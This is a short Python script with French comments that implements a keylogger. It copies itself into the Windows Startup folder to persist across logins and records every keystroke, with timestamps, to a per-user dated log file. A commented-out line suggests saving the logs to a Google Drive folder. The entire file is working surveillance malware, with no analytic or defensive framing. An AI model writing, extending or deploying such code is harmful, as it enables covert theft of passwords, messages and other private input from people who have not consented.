from pynput.keyboard import Listener

import os
import logging 
import datetime
from shutil import copyfile

username = os.getlogin()



# **** copier pour qu'il s'allume au démarrage
copyfile('main.py',f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.py")

# ****  on va ranger ça où ? le nom du fichier ? #####

# **** nomEmplacementSauvegarde = "G:/Mon Drive/KeyLogger Sauvegarde"
nomEmplacementSauvegarde = "data"
if not os.path.exists(nomEmplacementSauvegarde):
	os.makedirs(nomEmplacementSauvegarde)

dateajd = datetime.datetime.now().strftime('%Y-%m-%d')
datenow = datetime.datetime.now().strftime('%H:%M:%S')
nomfile = username + " touch " + dateajd + ".txt"


logging_dir = nomEmplacementSauvegarde
FORMAT = dateajd + "%(message)s"
logging.basicConfig(filename=f"{logging_dir}/{nomfile}", level=logging.DEBUG, format=f"%(asctime)-15s %(message)s")

def on_press(key):
	mot = ""
	
	print(key)
	logging.info(key)
    
with Listener(on_press=on_press) as lis:
    lis.join()
    


test
